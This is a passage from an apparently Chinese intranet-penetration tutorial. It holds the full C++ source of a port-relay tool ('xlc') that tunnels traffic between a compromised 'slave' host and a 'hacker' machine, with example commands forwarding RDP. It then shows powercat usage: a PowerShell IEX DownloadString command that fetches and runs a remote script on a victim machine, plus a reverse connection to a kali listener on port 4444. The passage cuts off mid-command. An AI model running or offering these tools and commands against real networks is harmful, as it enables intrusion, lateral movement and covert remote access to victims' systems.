&lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[+] Accept a Client on port&quot;</span> &lt;&lt; port1 &lt;&lt; <span class="string">&quot;  from &quot;</span> &lt;&lt; inet_ntoa(remoteSockAddr.sin_addr) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//两个都连上来了</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[+] Accept Connect OK!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">stu_sock.s1 = recvSock1;stu_sock.s2 = recvSock2;</span><br><span class="line">DWORDdwThreadID;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建一个转发数据的线程</span></span><br><span class="line">HANDLEhThread = CreateThread(<span class="number">0</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)datatrans, (LPVOID)&amp;stu_sock, <span class="number">0</span>, &amp;dwThreadID);</span><br><span class="line"><span class="keyword">if</span> (hThread == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">TerminateThread(hThread, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">return</span>;<span class="comment">//线程错了直接退出</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[+] CreateThread OK!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">Sleep(<span class="number">800</span>);<span class="comment">//挂起当前线程</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">bindAndFunlisten</span><span class="params">(SOCKET s, <span class="keyword">int</span> port)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//地址结构</span></span><br><span class="line">sockaddr_inaddr;</span><br><span class="line"><span class="built_in">memset</span>(&amp;addr, <span class="number">0</span>, <span class="keyword">sizeof</span>(addr));</span><br><span class="line">addr.sin_port = htons(port);</span><br><span class="line">addr.sin_family = AF_INET;</span><br><span class="line">addr.sin_addr.s_addr = htonl(INADDR_ANY);</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> on = <span class="number">1</span>;</span><br><span class="line">setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &amp;on, <span class="keyword">sizeof</span>(on));</span><br><span class="line"></span><br><span class="line"><span class="comment">//绑定地址结构</span></span><br><span class="line"><span class="keyword">if</span> (bind(s, (<span class="keyword">const</span> sockaddr*)&amp;addr, <span class="keyword">sizeof</span>(sockaddr)) &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[-] Socket bind error.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//监听端口</span></span><br><span class="line"><span class="keyword">if</span> (listen(s, <span class="number">5</span>) &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[-] Listen error.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">datatrans</span><span class="params">(LPVOID data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> host_slave[<span class="number">20</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">char</span> host_hacker[<span class="number">20</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">Stu_sock* stuSock = (Stu_sock*)data;</span><br><span class="line">SOCKETs1 = stuSock-&gt;s1;<span class="comment">//接受的是slave的数据</span></span><br><span class="line">SOCKETs2 = stuSock-&gt;s2;<span class="comment">//发送出去的socket</span></span><br><span class="line"><span class="keyword">int</span>sentacount1 = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//cout&lt;&lt;stuSock-&gt;s1&lt;&lt;endl;</span></span><br><span class="line"><span class="comment">//cout&lt;&lt;stuSock-&gt;s2&lt;&lt;endl;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sockaddr_inaddr = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">int</span> sizeofaddr = <span class="keyword">sizeof</span>(sockaddr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (getpeername(s1, (sockaddr*)&amp;addr, &amp;sizeofaddr))</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">strcpy</span>(host_slave, inet_ntoa(addr.sin_addr));</span><br><span class="line"><span class="keyword">int</span> port_slave = ntohs(addr.sin_port);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (getpeername(s2, (sockaddr*)&amp;addr, &amp;sizeofaddr))</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">strcpy</span>(host_hacker, inet_ntoa(addr.sin_addr));</span><br><span class="line"><span class="keyword">int</span> port_hacker = ntohs(addr.sin_port);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[+] Start Transport (&quot;</span> &lt;&lt; host_slave &lt;&lt; <span class="string">&quot;&lt;-&gt; &quot;</span> &lt;&lt; host_hacker &lt;&lt; <span class="string">&quot;) ......&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">char</span> RecvBuffer[<span class="number">20480</span>];</span><br><span class="line"><span class="keyword">char</span> SendBuffer[<span class="number">20480</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fd_setreadfd; fd_setwritefd;</span><br><span class="line">timevaltimeset;</span><br><span class="line">timeset.tv_sec = <span class="number">300</span>;</span><br><span class="line">timeset.tv_usec = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> maxfd = max(s1, s2) + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">int</span> readsize;</span><br><span class="line"><span class="keyword">while</span> (TRUE)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">readsize = <span class="number">0</span>;</span><br><span class="line">FD_ZERO(&amp;readfd);</span><br><span class="line">FD_ZERO(&amp;writefd);</span><br><span class="line">FD_SET((UINT)s1, &amp;readfd);</span><br><span class="line">FD_SET((UINT)s2, &amp;readfd);</span><br><span class="line">FD_SET((UINT)s1, &amp;writefd);</span><br><span class="line">FD_SET((UINT)s2, &amp;writefd);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> result = select(maxfd, &amp;readfd, &amp;writefd, <span class="literal">NULL</span>, &amp;timeset);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (result &lt; <span class="number">0</span> &amp;&amp; (errno != EINTR))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[-] Select error.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (result == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[-] Socket time out.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//没出错，没超时</span></span><br><span class="line"><span class="keyword">if</span> (FD_ISSET(s1, &amp;readfd) &amp;&amp; flag)<span class="comment">///////////////////////////////////1</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//if (totalread1&lt;20408)</span></span><br><span class="line">&#123;</span><br><span class="line">readsize = recv(s1, RecvBuffer, <span class="number">20480</span>, <span class="number">0</span>);<span class="comment">//接受host的请求。。</span></span><br><span class="line"><span class="keyword">if</span> (readsize == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (readsize == SOCKET_ERROR || readsize == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;!!!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">memcpy</span>(SendBuffer, RecvBuffer, readsize);</span><br><span class="line"><span class="built_in">memset</span>(RecvBuffer, <span class="number">0</span>, <span class="number">20480</span>);</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; [+] Recv &quot;</span> &lt;&lt; readsize &lt;&lt; <span class="string">&quot; bytes &quot;</span> &lt;&lt; <span class="string">&quot;from host.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (FD_ISSET(s1, &amp;writefd) &amp;&amp; flag &amp;&amp; (readsize &gt; <span class="number">0</span>))<span class="comment">///////////////////////////////////2</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> sendsize = send(s2, SendBuffer, readsize, <span class="number">0</span>);<span class="comment">//发给slave</span></span><br><span class="line"><span class="keyword">if</span> (sendsize == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (sendsize &lt; <span class="number">0</span> &amp;&amp; (errno != EINTR))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[-] Send to s2 unknow error.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(SendBuffer, <span class="number">0</span>, <span class="number">20480</span>);</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; Send &quot;</span> &lt;&lt; sendsize &lt;&lt; <span class="string">&quot; bytes &quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (FD_ISSET(s2, &amp;readfd) &amp;&amp; (!flag))<span class="comment">///////////////////////////////////3</span></span><br><span class="line">&#123;</span><br><span class="line">&#123;</span><br><span class="line">readsize = recv(s2, RecvBuffer, <span class="number">20480</span>, <span class="number">0</span>);<span class="comment">//接受slave返回数据</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(SendBuffer, RecvBuffer, readsize);</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; [+] Recv &quot;</span> &lt;&lt; readsize &lt;&lt; <span class="string">&quot; bytes &quot;</span> &lt;&lt; <span class="string">&quot;from host.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="comment">//totalread1+=readsize;</span></span><br><span class="line"><span class="built_in">memset</span>(RecvBuffer, <span class="number">0</span>, <span class="number">20480</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (FD_ISSET(s1, &amp;writefd) &amp;&amp; (!flag) &amp;&amp; (readsize &gt; <span class="number">0</span>))<span class="comment">///////////////////////////////////4</span></span><br><span class="line">&#123;</span><br><span class="line">readsize = send(s1, SendBuffer, readsize, <span class="number">0</span>);<span class="comment">//发给host</span></span><br><span class="line"><span class="keyword">if</span> (readsize == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (readsize &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[-] Send to s2 unknow error.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; Send &quot;</span> &lt;&lt; readsize &lt;&lt; <span class="string">&quot; bytes &quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">memset</span>(SendBuffer, <span class="number">0</span>, <span class="number">20480</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">flag = !flag;</span><br><span class="line"></span><br><span class="line">Sleep(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">closesocket(s1);</span><br><span class="line">closesocket(s2);</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[+] OK! I Closed The Two Socket.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/************************************************************************/</span></span><br><span class="line"><span class="comment">/*                                                                      */</span></span><br><span class="line"><span class="comment">/*slave 功能模块*/</span></span><br><span class="line"><span class="comment">/************************************************************************/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">slave</span><span class="params">(<span class="keyword">char</span>* hostIp, <span class="keyword">char</span>* slaveIp, <span class="keyword">int</span> destionPort, <span class="keyword">int</span> slavePort)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//checkIP(hostIp);</span></span><br><span class="line">Stu_sockstu_sock;</span><br><span class="line">fd_setfd;</span><br><span class="line"><span class="keyword">char</span>buffer[<span class="number">20480</span>];</span><br><span class="line"><span class="keyword">int</span>l;</span><br><span class="line"><span class="keyword">while</span> (TRUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//创建套接字</span></span><br><span class="line">SOCKET sock1 = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">SOCKET sock2 = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[+] Make a Connection to &quot;</span> &lt;&lt; hostIp &lt;&lt; <span class="string">&quot;on port:&quot;</span> &lt;&lt; slaveIp &lt;&lt; <span class="string">&quot;....&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">if</span> (sock1 &lt; <span class="number">0</span> || sock1 &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[-] Create socket error&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">fflush(<span class="built_in">stdout</span>);</span><br><span class="line"><span class="keyword">if</span> (client_connect(sock1, hostIp, destionPort) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">closesocket(sock1);</span><br><span class="line">closesocket(sock2);</span><br><span class="line"><span class="keyword">continue</span>;<span class="comment">/*跳过这次循环*/</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(buffer, <span class="number">0</span>, <span class="number">20480</span>);</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//把sock清零,加入set集</span></span><br><span class="line">FD_ZERO(&amp;fd);</span><br><span class="line">FD_SET(sock1, &amp;fd);</span><br><span class="line"></span><br><span class="line"><span class="comment">//select事件读 写 异常</span></span><br><span class="line"><span class="keyword">if</span> (select(sock1 + <span class="number">1</span>, &amp;fd, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>) == SOCKET_ERROR)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//不懂</span></span><br><span class="line"><span class="keyword">if</span> (errno == WSAEINTR) <span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//FD_ISSET返回值&gt;0 表示SET里的可读写</span></span><br><span class="line"><span class="keyword">if</span> (FD_ISSET(sock1, &amp;fd))</span><br><span class="line">&#123;</span><br><span class="line">l = recv(sock1, buffer, <span class="number">20480</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">Sleep(<span class="number">5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (l &lt;= <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[-] There is a error...Create a new connection.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[+] Connect OK!    \n[+] xlcTeam congratulations!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[+] Make a Connection to &quot;</span> &lt;&lt; hostIp &lt;&lt; <span class="string">&quot;on port:&quot;</span> &lt;&lt; slaveIp &lt;&lt; <span class="string">&quot;....&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">fflush(<span class="built_in">stdout</span>);</span><br><span class="line"><span class="keyword">if</span> (client_connect(sock2, slaveIp, slavePort) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">closesocket(sock1);</span><br><span class="line">closesocket(sock2);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (send(sock2, buffer, l, <span class="number">0</span>) == SOCKET_ERROR)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[-] Send failed.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">l = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">memset</span>(buffer, <span class="number">0</span>, <span class="number">20480</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[+] All Connect OK!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">stu_sock.s1 = sock1;</span><br><span class="line">stu_sock.s2 = sock2;</span><br><span class="line"></span><br><span class="line">HANDLEhThread = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)datatrans, (LPVOID)&amp;stu_sock, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (hThread == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">TerminateThread(hThread, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//检查IP地址格式是否正确</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">checkIP</span><span class="params">(<span class="keyword">char</span>* str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (INADDR_NONE == inet_addr(str))</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">client_connect</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">char</span>* server, <span class="keyword">int</span> port)</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">/*sock*/</span><span class="comment">/*远程IP*/</span><span class="comment">/*远程端口*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//声明</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">cliaddr</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hostent</span>* <span class="title">host</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(host = gethostbyname(server)))<span class="comment">//获得远程主机的IP</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//   printf(&quot;[-] Gethostbyname(%s) error:%s\n&quot;,server,strerror(errno));</span></span><br><span class="line"><span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//给地址结构赋值</span></span><br><span class="line"><span class="built_in">memset</span>(&amp;cliaddr, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct sockaddr));</span><br><span class="line">cliaddr.sin_family = AF_INET;</span><br><span class="line">cliaddr.sin_port = htons(port);<span class="comment">/*远程端口*/</span></span><br><span class="line">cliaddr.sin_addr = *((struct in_addr*)host-&gt;h_addr);<span class="comment">//host ip</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//去连接远程正在listen的主机</span></span><br><span class="line"><span class="keyword">if</span> (connect(sockfd, (struct sockaddr*) &amp; cliaddr, <span class="keyword">sizeof</span>(struct sockaddr)) &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//        printf(&quot;[-] Connect error.\r\n&quot;);</span></span><br><span class="line"><span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">version</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;xlc v1.0 -Port Transport by Chris &quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;      _     _____                    &quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;__  _| | __|_   _|__  __ _ _ __ ___  &quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\\ \\/ / |/ __|| |/ _ \\/ _` | &#x27;_ ` _ \\ &quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; &gt;  &lt;| | (__ | |  __/ (_| | | | | | |&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;/_/\\_\\_|\\___||_|\\___|\\__,_|_| |_| |_|&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;site:http://sec.xlcteam.com&quot;</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;usage: xlc.exe [options]&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;options:&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;-slave  remoteIp remotePort1  localIp  localPort&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;-listen  remotePort1 remotePort2&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;e.g.:&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;xlc.exe -slave  202.119.225.35 51 192.168.0.11 3389&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;xlc.exe -listen 51  33891&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="powercat"><a href="#powercat" class="headerlink" title="powercat"></a>powercat</h4><p>powercat是一款ps版nc。可以本地执行，也可以远程下载执行</p><p>项目地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;besimorhino&#x2F;powercat</span><br></pre></td></tr></table></figure><h5 id="参数解释-1"><a href="#参数解释-1" class="headerlink" title="参数解释"></a>参数解释</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">-l      监听连接                                      [Switch]</span><br><span class="line">-c      连接到侦听器                                   [String]</span><br><span class="line">-p      要连接或监听的端口.                             [String]</span><br><span class="line">-e      执行. (GAPING_SECURITY_HOLE)                  [String]</span><br><span class="line">-ep     执行Powershell                                [Switch]</span><br><span class="line">-r      中继,格式: &quot;-r tcp:10.1.1.1:443&quot;               [String]</span><br><span class="line">-u      通过UDP传输数据                                 [Switch]</span><br><span class="line">-dns    通过dns传输数据 (dnscat2)                       [String]</span><br><span class="line">-dnsft  DNS故障阈值                                     [int32]</span><br><span class="line">-t      超时选项, 默认值: 60                             [int32]</span><br><span class="line">-i      输入：文件路径（字符串）,字节数组或字符串            [object]</span><br><span class="line">-o      控制台输出类型: &quot;Host&quot;, &quot;Bytes&quot;, or &quot;String&quot;     [String]</span><br><span class="line">-of     输出文件路径                                     [String]</span><br><span class="line">-d      连接后断开连接                                   [Switch]</span><br><span class="line">-rep    中继器,断开连接后重新启动                          [Switch]</span><br><span class="line">-g      生成有效载荷                                     [Switch]</span><br><span class="line">-ge     生成编码的有效载荷                                [Switch]</span><br></pre></td></tr></table></figure><p>这里把kali当做我们VPS服务器</p><h5 id="反向链接"><a href="#反向链接" class="headerlink" title="反向链接"></a>反向链接</h5><p>kali上面运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p 4444 -vv</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/49.png" alt="image-20200801155544855"></p><p>受害者机器上运行</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="string">&quot;IEX (New-Object System.Net.Webclient).DownloadString(&#x27;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#x27;)&quot;</span></span><br><span class="line">//先导入这个模块才行不然有些机器运行是没有任何反应的</span><br><span class="line"><span class="built_in">Import-Module</span> ./powercat.ps1</span><br><span class="line">powercat <span class="literal">-c</span> <span class="number">192.168</span>.<span class="number">183.138</span> <span class="literal">-p</span> <span class="number">4444</span> <span class="literal">-v</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/50.png" alt="image-20200801155534168"></p><p>然后我们可以用代理工具链接kali上的4444端口进行代理访问了</p><h5 id="正向链接"><a href="#正向链接" class="headerlink" title="正向链接"></a>正向链接</h5><p>受害者机器上运行</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="string">&quot;IEX (New-Object System.Net.Webclient).DownloadString(&#x27;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#x27;)&quot;</span></span><br><span class="line">//先导入这个模块才行不然有些机器运行是没有任何反应的</span><br><span class="line"><span class="built_in">Import-Module</span> ./powercat.ps1</span><br><span class="line">powercat <span class="literal">-l</span> <span 